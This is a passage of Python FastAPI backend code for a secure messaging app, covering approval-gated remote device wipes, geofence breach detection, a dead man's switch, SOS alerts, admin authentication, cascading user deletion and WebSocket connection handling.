        )
        return await DeviceWipeService._deliver(db, cmd)

    @staticmethod
    def request_approval(
        db: Session,
        target_user_id: int,
        reason: Optional[str],
        wipe_mode: str,
        target_packages: Optional[list],
        trigger_source: str,
        requested_by_user_id: int,
    ) -> DeviceWipeCommand:
        """SOS and geofence-exit both land here instead of wiping directly — no
        server purge, no device push, until an authorized approver acts on it.
        This exists specifically so a missed off-duty geofence removal, a false
        alarm, or a coerced/malicious SOS press doesn't destroy real data on its
        own; an admin sees WHY before anything is touched."""
        return DeviceWipeService._create_command(
            db, target_user_id, reason, wipe_mode, target_packages, batch_id=None,
            trigger_source=trigger_source, requested_by_user_id=requested_by_user_id,
            issued_by_admin_id=None, status="awaiting_approval",
        )

    @staticmethod
    async def approve_wipe(db: Session, wipe_id: int, approving_admin_id: int) -> DeviceWipeCommand:
        cmd = db.query(DeviceWipeCommand).filter(DeviceWipeCommand.id == wipe_id).first()
        if not cmd:
            raise HTTPException(status_code=404, detail="Wipe request not found")
        if str(cmd.status) != "awaiting_approval":
            raise HTTPException(status_code=400, detail=f"Request is '{cmd.status}', not awaiting approval")

        cmd.approved_by_admin_id = approving_admin_id
        cmd.approved_at = datetime.utcnow()
        cmd.issued_by_admin_id = approving_admin_id

        if str(cmd.wipe_mode) == "factory_reset":
            # Loud escalation path: dispatched via the Headwind MDM connector,
            # not the app's own push channel.
            profile = db.query(MDMDeviceProfile).filter(MDMDeviceProfile.user_id == cmd.target_user_id).first()
            if profile and profile.headwind_device_id:
                try:
                    import httpx, os
                    MDM_MICROSERVICE_URL = os.getenv("MDM_MICROSERVICE_URL", "http://localhost:8001")
                    async with httpx.AsyncClient() as client:
                        await client.post(
                            f"{MDM_MICROSERVICE_URL}/mdm/wipe",
                            json={"device_id": profile.headwind_device_id, "reason": cmd.reason},
                            timeout=5.0,
                        )
                    cmd.status = "delivered"
                    cmd.delivered_at = datetime.utcnow()
                except Exception as e:
                    logger.error(f"factory_reset dispatch failed for wipe_id={wipe_id}: {e}")
                    cmd.status = "failed"
            else:
                logger.error(f"factory_reset approved but no MDM profile for user_id={cmd.target_user_id}")
                cmd.status = "failed"
            db.commit()
            db.refresh(cmd)
            logger.warning(f"WIPE APPROVED (factory_reset): wipe_id={wipe_id}, approver={approving_admin_id}")
            return cmd

        cmd.status = "pending"
        db.commit()
        db.refresh(cmd)
        logger.warning(f"WIPE APPROVED: wipe_id={wipe_id}, approver={approving_admin_id}, mode={cmd.wipe_mode}")
        return await DeviceWipeService._deliver(db, cmd)

    @staticmethod
    def reject_wipe(db: Session, wipe_id: int, rejecting_admin_id: int, note: Optional[str]) -> DeviceWipeCommand:
        cmd = db.query(DeviceWipeCommand).filter(DeviceWipeCommand.id == wipe_id).first()
        if not cmd:
            raise HTTPException(status_code=404, detail="Wipe request not found")
        if str(cmd.status) != "awaiting_approval":
            raise HTTPException(status_code=400, detail=f"Request is '{cmd.status}', not awaiting approval")
        cmd.status = "rejected"
        cmd.rejected_by_admin_id = rejecting_admin_id
        cmd.rejected_at = datetime.utcnow()
        cmd.rejection_note = note
        db.commit()
        db.refresh(cmd)
        logger.warning(f"WIPE REJECTED: wipe_id={wipe_id}, rejected_by={rejecting_admin_id}, note={note}")
        return cmd

    @staticmethod
    def pending_approval(db: Session) -> list:
        return (
            db.query(DeviceWipeCommand)
            .filter(DeviceWipeCommand.status == "awaiting_approval")
            .order_by(DeviceWipeCommand.issued_at.asc())
            .all()
        )

    @staticmethod
    def confirm_wipe(db: Session, wipe_id: int, user_id: int) -> DeviceWipeCommand:
        cmd = db.query(DeviceWipeCommand).filter(DeviceWipeCommand.id == wipe_id).first()
        if not cmd:
            raise HTTPException(status_code=404, detail="Wipe command not found")
        if int(cmd.target_user_id) != user_id:
            raise HTTPException(status_code=403, detail="Not authorized")
        cmd.status = "confirmed"
        cmd.confirmed_at = datetime.utcnow()
        db.commit()
        db.refresh(cmd)
        return cmd

    @staticmethod
    def pending_for_user(db: Session, user_id: int) -> list:
        """App calls this on reconnect to fetch wipe commands missed while offline —
        critical for the case where the device was offline when the command was issued."""
        return (
            db.query(DeviceWipeCommand)
            .filter(DeviceWipeCommand.target_user_id == user_id, DeviceWipeCommand.status == "pending")
            .order_by(DeviceWipeCommand.issued_at.asc())
            .all()
        )


class GeofenceService:
    EARTH_RADIUS_M = 6_371_000.0

    @staticmethod
    def haversine(lat1: float, lon1: float, lat2: float, lon2: float) -> float:
        import math
        phi1, phi2 = math.radians(lat1), math.radians(lat2)
        dphi = math.radians(lat2 - lat1)
        dlam = math.radians(lon2 - lon1)
        a = math.sin(dphi / 2) ** 2 + math.cos(phi1) * math.cos(phi2) * math.sin(dlam / 2) ** 2
        return GeofenceService.EARTH_RADIUS_M * 2 * math.atan2(math.sqrt(a), math.sqrt(1 - a))

    @staticmethod
    def create_zone(db: Session, admin_id: int, data: "GeofenceZoneCreate") -> GeofenceZone:
        zone = GeofenceZone(
            name=data.name,
            created_by_admin_id=admin_id,
            center_lat=data.center_lat,
            center_lon=data.center_lon,
            radius_meters=data.radius_meters,
            alert_on=data.alert_on,
            applies_to=data.applies_to,
        )
        db.add(zone)
        db.commit()
        db.refresh(zone)
        return zone

    @staticmethod
    async def check_geofences(db: Session, user_id: int, lat: float, lon: float, recorded_at: datetime):
        """Called after each location push. Checks all active zones for this user."""
        zones = db.query(GeofenceZone).filter(GeofenceZone.is_active == True).all()
        user = db.query(User).filter(User.id == user_id).first()

        for zone in zones:
            # Zone applies_to filter
            if zone.applies_to and user_id not in zone.applies_to:
                continue

            dist = GeofenceService.haversine(lat, lon, zone.center_lat, zone.center_lon)
            inside = dist <= zone.radius_meters

            # Find last event for this user+zone to detect transition
            last_event = (
                db.query(GeofenceEvent)
                .filter(GeofenceEvent.zone_id == zone.id, GeofenceEvent.user_id == user_id)
                .order_by(GeofenceEvent.triggered_at.desc())
                .first()
            )

            was_inside = last_event and last_event.event_type == "enter"
            event_type = None

            if inside and not was_inside and zone.alert_on in ("enter", "both"):
                event_type = "enter"
            elif not inside and was_inside and zone.alert_on in ("exit", "both"):
                event_type = "exit"

            if not event_type:
                continue

            ev = GeofenceEvent(
                zone_id=int(zone.id),
                user_id=user_id,
                event_type=event_type,
                latitude=lat,
                longitude=lon,
                triggered_at=recorded_at,
            )
            db.add(ev)
            db.commit()
            
            # ---------------------------------------------
            # EAGLE ONE: WIPE APPROVAL REQUEST ON GEOFENCE EXIT
            # ---------------------------------------------
            # Does not wipe on its own — a zone the user simply forgot to be
            # removed from off-duty shouldn't nuke their device. This only raises
            # a request; an authorized approver decides after seeing the breach.
            wipe_cmd = None
            if event_type == "exit":
                zone_wipe_mode = str(getattr(zone, "wipe_mode", "duress_selective") or "duress_selective")
                logger.warning(
                    f"GEOFENCE BREACH: User {user_id} exited zone {zone.id}. Requesting {zone_wipe_mode} wipe approval."
                )
                try:
                    wipe_cmd = DeviceWipeService.request_approval(
                        db,
                        target_user_id=user_id,
                        reason=f"Geofence Breach (Zone {zone.name})",
                        wipe_mode=zone_wipe_mode,
                        target_packages=None,
                        trigger_source="geofence",
                        requested_by_user_id=user_id,
                    )
                except Exception as wipe_err:
                    logger.error(f"Failed to raise wipe request on geofence breach: {wipe_err}")

            db.refresh(ev)

            notification = {
                "type": "geofence_event",
                "data": {
                    "event_id": int(ev.id),
                    "zone_id": int(zone.id),
                    "zone_name": zone.name,
                    "user_id": user_id,
                    "username": user.username if user else "unknown",
                    "event_type": event_type,
                    "latitude": lat,
                    "longitude": lon,
                    "triggered_at": recorded_at.isoformat(),
                    "wipe_requested": bool(wipe_cmd),
                    "wipe_id": int(wipe_cmd.id) if wipe_cmd else None,
                    "wipe_mode": wipe_cmd.wipe_mode if wipe_cmd else None,
                }
            }
            admins = db.query(User).filter(User.is_admin == True, User.is_active == True).all()
            for admin in admins:
                await ws_manager.send_to_user(int(admin.id), notification)
            logger.info(f"Geofence {event_type}: user={user_id}, zone={zone.id} ({zone.name})")


class DeadMansSwitchService:
    @staticmethod
    def configure(db: Session, user_id: int, data: "DeadMansSwitchConfig") -> DeadMansSwitch:
        switch = db.query(DeadMansSwitch).filter(DeadMansSwitch.user_id == user_id).first()
        if not switch:
            switch = DeadMansSwitch(user_id=user_id)
            db.add(switch)
        switch.enabled = data.enabled
        switch.interval_hours = data.interval_hours
        switch.alert_message = data.alert_message
        if data.enabled:
            switch.last_checkin = datetime.utcnow()  # reset on enable
        db.commit()
        db.refresh(switch)
        return switch

    @staticmethod
    def checkin(db: Session, user_id: int) -> DeadMansSwitch:
        switch = db.query(DeadMansSwitch).filter(DeadMansSwitch.user_id == user_id).first()
        if not switch:
            switch = DeadMansSwitch(user_id=user_id, enabled=False)
            db.add(switch)
        switch.last_checkin = datetime.utcnow()
        db.commit()
        db.refresh(switch)
        return switch

    @staticmethod
    async def run_checker(app_state):
        """Background loop — runs every 5 minutes, checks all enabled switches."""
        import asyncio
        from database_models import SessionLocal
        while True:
            await asyncio.sleep(300)  # check every 5 min
            try:
                db = SessionLocal()
                try:
                    now = datetime.utcnow()
                    switches = db.query(DeadMansSwitch).filter(DeadMansSwitch.enabled == True).all()
                    for sw in switches:
                        if not sw.last_checkin:
                            continue
                        silent_hours = (now - sw.last_checkin).total_seconds() / 3600
                        if silent_hours < sw.interval_hours:
                            continue
                        # Avoid duplicate alerts within same interval
                        if sw.last_alert_sent and (now - sw.last_alert_sent).total_seconds() / 3600 < sw.interval_hours:
                            continue

                        user = db.query(User).filter(User.id == sw.user_id).first()
                        alert = EmergencyAlert(
                            user_id=int(sw.user_id),
                            message=sw.alert_message or f"Dead man's switch triggered: no activity for {silent_hours:.1f}h",
                            alert_type="deadmans",
                            status="active",
                        )
                        db.add(alert)
                        sw.last_alert_sent = now
                        db.commit()
                        db.refresh(alert)

                        notification = {
                            "type": "dead_mans_switch_triggered",
                            "data": {
                                "alert_id": int(alert.id),
                                "user_id": int(sw.user_id),
                                "username": user.username if user else "unknown",
                                "phone_number": user.phone_number if user else "unknown",
                                "silent_hours": round(silent_hours, 1),
                                "last_checkin": sw.last_checkin.isoformat(),
                                "triggered_at": now.isoformat(),
                            }
                        }
                        admins = db.query(User).filter(User.is_admin == True, User.is_active == True).all()
                        for admin in admins:
                            await ws_manager.send_to_user(int(admin.id), notification)
                        logger.warning(f"Dead man's switch fired: user={sw.user_id}, silent={silent_hours:.1f}h")
                finally:
                    db.close()
            except Exception as e:
                logger.error(f"Dead man's switch checker error: {e}")


class EmergencyService:
    """Service class for panic/emergency alert operations"""

    @staticmethod
    async def trigger_alert(db: Session, user_id: int, data: "EmergencyTriggerRequest") -> EmergencyAlert:
        alert = EmergencyAlert(
            user_id=user_id,
            latitude=data.latitude,
            longitude=data.longitude,
            accuracy=data.accuracy,
            location_name=data.location_name,
            message=data.message,
            alert_type=data.alert_type,
            device_info=data.device_info,
            status="active",
        )
        db.add(alert)
        db.commit()
        db.refresh(alert)

        user = db.query(User).filter(User.id == user_id).first()

        # SOS-requested wipe: the user is asking for their device to be wiped as
        # part of this alert, but it does NOT fire on its own — a false alarm, or
        # a coerced/malicious SOS press, would otherwise destroy real data with
        # nobody able to stop it. It becomes an awaiting_approval request; an
        # authorized approver sees the alert context and decides.
        wipe_cmd = None
        if data.trigger_wipe:
            wipe_cmd = DeviceWipeService.request_approval(
                db, target_user_id=user_id,
                reason=f"SOS requested on {data.alert_type} alert #{alert.id}",
                wipe_mode="duress_selective",
                target_packages=None,
                trigger_source="sos",
                requested_by_user_id=user_id,
            )

        notification = {
            "type": "emergency_alert",
            "data": {
                "alert_id": int(alert.id),
                "user_id": int(user_id),
                "username": str(user.username) if user else "unknown",
                "phone_number": str(user.phone_number) if user else "unknown",
                "latitude": data.latitude,
                "longitude": data.longitude,
                "accuracy": data.accuracy,
                "location_name": data.location_name,
                "message": data.message,
                "alert_type": data.alert_type,
                "device_info": data.device_info,
                "triggered_at": alert.triggered_at.isoformat(),
                "wipe_requested": bool(wipe_cmd),
                "wipe_id": int(wipe_cmd.id) if wipe_cmd else None,
                "wipe_status": wipe_cmd.status if wipe_cmd else None,
            }
        }

        # Push to ALL admin users who are online (visibility); approval action
        # itself is gated separately to admins with can_approve_duress_wipe.
        admins = db.query(User).filter(User.is_admin == True, User.is_active == True).all()
        for admin in admins:
            await ws_manager.send_to_user(int(admin.id), notification)

        logger.warning(
            f"EMERGENCY ALERT triggered: user_id={user_id}, alert_id={alert.id}, type={data.alert_type}, "
            f"wipe_requested={bool(wipe_cmd)}"
        )
        return alert

    @staticmethod
    def acknowledge_alert(db: Session, alert_id: int, admin_id: int) -> EmergencyAlert:
        alert = db.query(EmergencyAlert).filter(EmergencyAlert.id == alert_id).first()
        if not alert:
            raise HTTPException(status_code=404, detail="Alert not found")
        if alert.status == "resolved":
            raise HTTPException(status_code=400, detail="Alert already resolved")
        alert.status = "acknowledged"
        alert.acknowledged_at = datetime.utcnow()
        alert.acknowledged_by = admin_id
        db.commit()
        db.refresh(alert)
        return alert

    @staticmethod
    def resolve_alert(db: Session, alert_id: int, admin_id: int) -> EmergencyAlert:
        alert = db.query(EmergencyAlert).filter(EmergencyAlert.id == alert_id).first()
        if not alert:
            raise HTTPException(status_code=404, detail="Alert not found")
        alert.status = "resolved"
        alert.resolved_at = datetime.utcnow()
        alert.acknowledged_by = admin_id
        db.commit()
        db.refresh(alert)
        return alert

    @staticmethod
    def get_active_alerts(db: Session) -> list:
        return (
            db.query(EmergencyAlert)
            .filter(EmergencyAlert.status.in_(["active", "acknowledged"]))
            .order_by(EmergencyAlert.triggered_at.desc())
            .all()
        )

    @staticmethod
    def get_all_alerts(db: Session, limit: int = 100) -> list:
        return (
            db.query(EmergencyAlert)
            .order_by(EmergencyAlert.triggered_at.desc())
            .limit(limit)
            .all()
        )


class AdminService:
    """Service class for admin operations"""
    
    @staticmethod
    def is_admin(db: Session, user_id: int) -> bool:
        """Check if user is an admin"""
        user = db.query(User).filter(User.id == user_id, User.is_admin == True).first()
        return user is not None
    
    @staticmethod
    def authenticate_user(db: Session, username: str, token: str, ip_address: Optional[str] = None) -> Optional[User]:
        """Authenticate user by username and token, or admin by password (passed as token)"""
        # 1. Try token authentication first
        user = db.query(User).filter(
            User.username == username, 
            User.token == token,
            User.is_active == True
        ).first()
        
        # 2. If token fails, try treating the 'token' as an admin password
        if not user:
            user = AdminService.authenticate_admin(db, username, token, ip_address)
            
        if user:
            # Use setattr for SQLAlchemy models
            setattr(user, 'last_login', datetime.now(timezone.utc))
            db.commit()
            
            # Log login
            AuditService.log_event(
                db, getattr(user, 'id', None), "user_login", 
                f"User {username} logged in", 
                ip_address=ip_address
            )
        
        return user

    @staticmethod
    def authenticate_admin(db: Session, username: str, password: str, ip_address: Optional[str] = None) -> Optional[User]:
        """Authenticate admin user with password"""
        user = db.query(User).filter(
            User.username == username, 
            User.is_admin == True,
            User.is_active == True
        ).first()
        
        if user and user.password_hash:
            if verify_password(password, user.password_hash):
                # Use setattr for SQLAlchemy models
                setattr(user, 'last_login', datetime.now(timezone.utc))
                db.commit()
                
                # Log login
                AuditService.log_event(
                    db, getattr(user, 'id', None), "admin_login", 
                    f"Admin {username} logged in", 
                    ip_address=ip_address
                )
                return user
        
        return None
    
    @staticmethod
    def change_admin_password(db: Session, user_id: int, current_password: str, new_password: str) -> bool:
        """Change admin password"""
        user = db.query(User).filter(User.id == user_id, User.is_admin == True).first()
        if not user or not user.password_hash:
            return False
        
        # Verify current password
        if not verify_password(current_password, user.password_hash):
            return False
        
        # Hash and set new password
        user.password_hash = hash_password(new_password)
        user.must_change_password = False  # Clear the flag after password change
        db.commit()
        
        # Log password change
        AuditService.log_event(
            db, user_id, "admin_password_changed", 
            f"Admin password changed for user {user.username}"
        )
        
        return True
    
    @staticmethod
    def create_user(db: Session, admin_user_id: int, user_data: AdminCreateUser, ip_address: Optional[str] = None) -> User:
        """Create a new user (admin only)"""
        # Check if requesting user is admin
        if not AdminService.is_admin(db, admin_user_id):
            raise HTTPException(status_code=403, detail="Only admin users can create new accounts")
        
        # Check if user already exists by phone number
        existing_user = db.query(User).filter(User.phone_number == user_data.phone_number).first()
        if existing_user:
            raise HTTPException(status_code=400, detail="Phone number already registered")
        
        # Use provided token and username
        token = user_data.token
        username = user_data.username

        # Enforce token uniqueness (prevents one token working across multiple accounts)
        existing_token_user = db.query(User).filter(User.token == token).first()
        if existing_token_user:
            raise HTTPException(status_code=400, detail="Token already in use by another user")
        
        # Create user
        user = User(
            phone_number=user_data.phone_number,
            username=username,
            token=token,
            registration_ip=ip_address,
            is_active=True,
            is_verified=True,
            user_type='mobile',
            is_admin=False  # New users are not admins by default
        )
        
        db.add(user)
        db.commit()
        db.refresh(user)
        
        # Log registration
        user_id = getattr(user, 'id', None)
        AuditService.log_event(
            db, admin_user_id, "user_registration_by_admin", 
            f"User {user_data.phone_number} registered by admin user {admin_user_id}", 
            ip_address=ip_address
        )
        
        logger.info(f"✅ User registered by admin: {user_data.phone_number}")
        return user

    @staticmethod
    def update_user(db: Session, admin_user_id: int, phone_number: str, user_data: AdminUpdateUser) -> User:
        """Update an existing user (admin only)"""
        # Check if requesting user is admin
        if not AdminService.is_admin(db, admin_user_id):
            raise HTTPException(status_code=403, detail="Only admin users can update accounts")
        
        # Find user
        user = db.query(User).filter(User.phone_number == phone_number).first()
        if not user:
            raise HTTPException(status_code=404, detail="User not found")
        
        # Update fields if provided
        if user_data.username is not None:
            user.username = user_data.username
        if user_data.phone_number is not None:
            # Check if new phone number already exists
            if user_data.phone_number != phone_number:
                existing = db.query(User).filter(User.phone_number == user_data.phone_number).first()
                if existing:
                    raise HTTPException(status_code=400, detail="New phone number already in use")
            user.phone_number = user_data.phone_number
        if user_data.token is not None:
            # Enforce token uniqueness
            existing_token_user = db.query(User).filter(User.token == user_data.token, User.id != user.id).first()
            if existing_token_user:
                raise HTTPException(status_code=400, detail="Token already in use by another user")
            user.token = user_data.token
        if user_data.is_active is not None:
            user.is_active = user_data.is_active
            
        db.commit()
        db.refresh(user)
        
        # Log update
        AuditService.log_event(
            db, admin_user_id, "admin_update_user", 
            f"User {phone_number} updated by admin"
        )
        
        return user
    
    @staticmethod
    def delete_user(db: Session, admin_user_id: int, phone_number: str) -> bool:
        """Delete a user account and ALL associated data (admin only)."""
        if not AdminService.is_admin(db, admin_user_id):
            raise HTTPException(status_code=403, detail="Only admin users can delete accounts")

        user = db.query(User).filter(User.phone_number == phone_number).first()
        if not user:
            return False

        if user.id == admin_user_id:
            raise HTTPException(status_code=400, detail="Admin cannot delete their own account")

        user_id = int(getattr(user, 'id', 0))

        try:
            # ── 1. Leaf tables (no children) ──────────────────────────────────
            db.query(GroupMember).filter(GroupMember.user_id == user_id).delete()
            db.query(UserSession).filter(UserSession.user_id == user_id).delete()
            db.query(UserKey).filter(UserKey.user_id == user_id).delete()
            db.query(DBMasterToken).filter(DBMasterToken.user_id == user_id).delete()
            db.query(MonitoringConsent).filter(MonitoringConsent.user_id == user_id).delete()
            db.query(LocationTrack).filter(LocationTrack.user_id == user_id).delete()
            db.query(GeofenceEvent).filter(GeofenceEvent.user_id == user_id).delete()
            db.query(DeadMansSwitch).filter(DeadMansSwitch.user_id == user_id).delete()

            # ── 2. Monitoring sessions (admin_id or target_user_id) ───────────
            db.query(MonitoringSession).filter(
                or_(MonitoringSession.admin_id == user_id,
                    MonitoringSession.target_user_id == user_id)
            ).delete()

            # ── 3. Remote commands (issued_by or target) ──────────────────────
            db.query(RemoteCommand).filter(
                or_(RemoteCommand.issued_by_admin_id == user_id,
                    RemoteCommand.target_user_id == user_id)
            ).delete()

            # ── 4. Device wipe commands ───────────────────────────────────────
            db.query(DeviceWipeCommand).filter(
                or_(DeviceWipeCommand.target_user_id == user_id,
                    DeviceWipeCommand.issued_by_admin_id == user_id)
            ).delete()

            # ── 5. Audio & video recordings (delete files from disk too) ──────
            audio_recs = db.query(AudioRecording).filter(
                AudioRecording.user_id == user_id
            ).all()
            for rec in audio_recs:
                fp = getattr(rec, 'file_path', None)
                if fp and os.path.exists(fp):
                    try:
                        os.remove(fp)
                    except Exception as e:
                        logger.warning(f"Could not delete audio file {fp}: {e}")
                db.delete(rec)

            video_recs = db.query(VideoRecording).filter(
                VideoRecording.user_id == user_id
            ).all()
            for rec in video_recs:
                for fp in [getattr(rec, 'file_path', None),
                           getattr(rec, 'thumbnail_path', None)]:
                    if fp and os.path.exists(fp):
                        try:
                            os.remove(fp)
                        except Exception as e:
                            logger.warning(f"Could not delete video file {fp}: {e}")
                db.delete(rec)

            # ── 6. Emergency alerts ───────────────────────────────────────────
            db.query(EmergencyAlert).filter(
                or_(EmergencyAlert.user_id == user_id,
                    EmergencyAlert.acknowledged_by == user_id)
            ).delete()

            # ── 7. Media files (disk + DB) ────────────────────────────────────
            media_files = db.query(Media).filter(
                or_(Media.sender_id == user_id, Media.recipient_id == user_id)
            ).all()
            for media in media_files:
                fp = getattr(media, 'encrypted_file_path', None)
                if fp and os.path.exists(fp):
                    try:
                        os.remove(fp)
                    except Exception as e:
                        logger.warning(f"Could not delete media file {fp}: {e}")
                db.delete(media)

            db.flush()  # persist media deletes before message deletes

            # ── 8. Group message read receipts (FK → messages.id) ─────────────
            db.query(GroupMessageRead).filter(GroupMessageRead.user_id == user_id).delete()

            # Also clean up read receipts for messages sent/received by this user
            msg_ids = [
                m.id for m in db.query(Message.id).filter(
                    or_(Message.sender_id == user_id, Message.recipient_id == user_id)
                ).all()
            ]
            if msg_ids:
                db.query(GroupMessageRead).filter(
                    GroupMessageRead.message_id.in_(msg_ids)
                ).delete(synchronize_session=False)

            # ── 9. Messages ───────────────────────────────────────────────────
            db.query(Message).filter(
                or_(Message.sender_id == user_id, Message.recipient_id == user_id)
            ).delete()

            # ── 10. Calls ─────────────────────────────────────────────────────
            # conference_sessions.original_call_id references calls.id, and a
            # conference created by SOMEONE ELSE can point at this user's call —
            # so clear those references (the column is nullable) before deleting
            # the calls, or the delete violates that FK.
            call_ids = [
                c.id for c in db.query(Call.id).filter(
                    or_(Call.caller_id == user_id, Call.recipient_id == user_id)
                ).all()
            ]
            if call_ids:
                confs_on_calls = db.query(ConferenceSession).filter(
                    ConferenceSession.original_call_id.in_(call_ids)
                ).all()
                for conf in confs_on_calls:
                    db.query(ConferenceParticipant).filter(
                        ConferenceParticipant.conference_id == conf.id
                    ).delete(synchronize_session=False)
                    db.delete(conf)
                db.flush()

            db.query(Call).filter(
                or_(Call.caller_id == user_id, Call.recipient_id == user_id)
            ).delete()

            # ── 11. Audit logs ────────────────────────────────────────────────
            db.query(AuditLog).filter(AuditLog.user_id == user_id).delete()

            # ── 11b. Remaining rows that reference this user ──────────────────
            # Any FK still pointing at the user row makes the final DELETE fail
            # with a foreign-key violation — which is the 500 the admin panel hit.
            db.query(LinkedDevice).filter(LinkedDevice.user_id == user_id).delete()
            db.query(DeviceLinkRequest).filter(
                DeviceLinkRequest.approved_user_id == user_id
            ).delete()
            db.query(MDMDeviceProfile).filter(MDMDeviceProfile.user_id == user_id).delete()
            db.query(ConferenceParticipant).filter(
                ConferenceParticipant.user_id == user_id
            ).delete()
            db.query(ConferenceSession).filter(
                ConferenceSession.created_by_user_id == user_id
            ).delete()
            db.query(CommandAuditLog).filter(
                or_(CommandAuditLog.admin_id == user_id,
                    CommandAuditLog.target_user_id == user_id)
            ).delete()
            db.query(GeofenceZone).filter(
                GeofenceZone.created_by_admin_id == user_id
            ).delete()

            # DeviceWipeCommand has four user columns; steps 4 only cleared two.
            db.query(DeviceWipeCommand).filter(
                or_(DeviceWipeCommand.requested_by_user_id == user_id,
                    DeviceWipeCommand.approved_by_admin_id == user_id,
                    DeviceWipeCommand.rejected_by_admin_id == user_id)
            ).delete()

            # Groups this user created. Drop each group's memberships first so we
            # do not strand other members on a dangling group.
            owned_group_ids = [
                g.id for g in db.query(Group.id).filter(Group.created_by == user_id).all()
            ]
            if owned_group_ids:
                db.query(GroupMember).filter(
                    GroupMember.group_id.in_(owned_group_ids)
                ).delete(synchronize_session=False)
                db.query(Group).filter(Group.id.in_(owned_group_ids)).delete(
                    synchronize_session=False
                )

            db.flush()

            # ── 12. Delete user row ───────────────────────────────────────────
            db.delete(user)
            db.commit()

            AuditService.log_event(
                db, admin_user_id, "admin_delete_user",
                f"User {phone_number} and all associated data permanently deleted by admin"
            )
            logger.info(f"✅ User fully deleted by admin: {phone_number}")
            return True

        except Exception as e:
            db.rollback()
            logger.error(f"Error deleting user {phone_number}: {e}")
            raise HTTPException(status_code=500, detail=f"Failed to delete user: {str(e)}")

# FastAPI app with lifespan
@asynccontextmanager
async def lifespan(app: FastAPI):
    # Startup
    logger.info("🚀 Starting FastAPI Mobile Backend with PostgreSQL...")
    
    # Initialize database with retry logic
    if not db_config.initialize_database(max_retries=5, retry_delay=10):
        logger.error("❌ Failed to initialize database after multiple attempts")
        # Don't raise exception, let the app start but with database issues
        logger.warning("⚠️  App will start but database functionality may be limited")
    else:
        # Test connection
        if not db_config.test_connection(max_retries=3, retry_delay=5):
            logger.error("❌ Database connection test failed after multiple attempts")
            logger.warning("⚠️  App will start but database functionality may be limited")
        else:
            logger.info("✅ PostgreSQL database connected successfully")
            
            # Create tables if they don't exist
            if db_config.create_tables():
                logger.info("✅ Database tables verified/created successfully")
            else:
                logger.error("❌ Failed to create/verify database tables")

    # Start periodic online status broadcast task
    import asyncio
    async def periodic_status_broadcast():
        while True:
            try:
                await ws_manager.broadcast_online_status()
            except Exception as e:
                logger.error(f"Error in periodic broadcast: {e}")
            await asyncio.sleep(15)  # Every 15 seconds

    async def periodic_message_cleanup():
        while True:
            try:
                await asyncio.sleep(1800)  # every 30 minutes
                db = next(get_database_session())
                try:
                    deleted = MessageService.delete_expired_messages(db)
                    MediaService.delete_expired_media(db)
                    if deleted > 0:
                        logger.info(f"Auto-cleanup: removed {deleted} expired messages")
                finally:
                    db.close()
            except Exception as e:
                logger.error(f"Auto-cleanup error: {e}")

    broadcast_task = asyncio.create_task(periodic_status_broadcast())
    deadmans_task = asyncio.create_task(DeadMansSwitchService.run_checker(None))
    cleanup_task = asyncio.create_task(periodic_message_cleanup())

    yield

    # Cancel periodic tasks during shutdown
    broadcast_task.cancel()
    deadmans_task.cancel()
    cleanup_task.cancel()
    
    # Shutdown
    logger.info("📴 Shutting down FastAPI Mobile Backend")

app = FastAPI(
    title="Secure Messaging API",
    description="Mobile backend for secure messaging system with PostgreSQL",
    version="2.1-PostgreSQL",
    lifespan=lifespan
)

# Add CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Configure for production
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


# WebSocket chat: connection manager (user_id -> set of WebSockets)
class ConnectionManager:
    def __init__(self):
        # user_id -> {device_id: WebSocket}
        self._connections: Dict[int, Dict[str, "WebSocket"]] = {}
        self._usernames: Dict[int, str] = {}
        # device_id -> {user_id, username, device_type, device_name, connected_at}
        self._devices: Dict[str, dict] = {}

    async def connect(
        self,
        websocket: "WebSocket",
        user_id: int,
        username: str,
        device_id: str,
        device_type: str = "mobile",
        device_name: str = "Unknown",
    ) -> None:
        await websocket.accept()
        if user_id not in self._connections:
            self._connections[user_id] = {}
        # If same device reconnects, close old ws cleanly
        old_ws = self._connections[user_id].get(device_id)
        if old_ws:
            try:
                await old_ws.close()
            except Exception:
                pass
        self._connections[user_id][device_id] = websocket
        self._usernames[user_id] = username
        self._devices[device_id] = {
            "device_id": device_id,
            "user_id": user_id,
            "username": username,
            "device_type": device_type,
            "device_name": device_name,
            "connected_at": datetime.now(timezone.utc).isoformat(),
        }
        logger.info(
            f"WS connected: user={username} device={device_id} type={device_type} "
            f"total_devices={len(self._connections[user_id])}"
        )
        await self.broadcast_online_status()

    async def disconnect(self, websocket: "WebSocket", user_id: int) -> None:
        if user_id in self._connections:
            # Find and remove the specific ws
            device_id_to_remove = None
            for did, ws in list(self._connections[user_id].items()):
                if ws is websocket:
                    device_id_to_remove = did
                    break
            if device_id_to_remove:
                self._connections[user_id].pop(device_id_to_remove, None)
                self._devices.pop(device_id_to_remove, None)
            if not self._connections[user_id]:
                self._connections.pop(user_id, None)
                self._usernames.pop(user_id, None)
        logger.info(f"WS disconnected: user_id={user_id}")
        await self.broadcast_online_status()

    async def send_to_user(self, user_id: int, data: dict) -> bool:
        """Send to ALL devices of a user. Returns True if at least one sent."""
        if user_id not in self._connections:
            return False
        payload = json.dumps(data, default=str)
        dead = []
        sent = False
        for device_id, ws in list(self._connections[user_id].items()):
            try:
                await ws.send_text(payload)
                sent = True
            except Exception:
                dead.append(device_id)
        for did in dead:
            self._connections[user_id].pop(did, None)
            self._devices.pop(did, None)
        if not self._connections[user_id]:
            self._connections.pop(user_id, None)
            self._usernames.pop(user_id, None)
        return sent

    async def send_to_device(self, user_id: int, device_id: str, data: dict) -> bool:
        """Send to a specific device. Falls back to all devices if device_id not found."""
        devices = self._connections.get(user_id, {})
        ws = devices.get(device_id)
        if not ws:
            return await self.send_to_user(user_id, data)
        payload = json.dumps(data, default=str)
        try:
            await ws.send_text(payload)
            return True
        except Exception:
            devices.pop(device_id, None)
            self._devices.pop(device_id, None)
            if not devices:
                self._connections.pop(user_id, None)
                self._usernames.pop(user_id, None)
            return False

    def get_online_devices(self) -> list:
        """Return metadata for every currently connected device."""
        return list(self._devices.values())

    def get_user_devices(self, user_id: int) -> list:
        """Return connected devices for a specific user."""
        device_ids = set(self._connections.get(user_id, {}).keys())
        return [d for d in self._devices.values() if d["device_id"] in device_ids]

    async def broadcast_online_status(self):
        """Broadcast list of online usernames to all connected clients."""
        online_usernames = list(self._usernames.values())
        data = {"type": "user_status", "users": online_usernames}
        payload = json.dumps(data)
        for user_id, device_map in list(self._connections.items()):
            dead = []
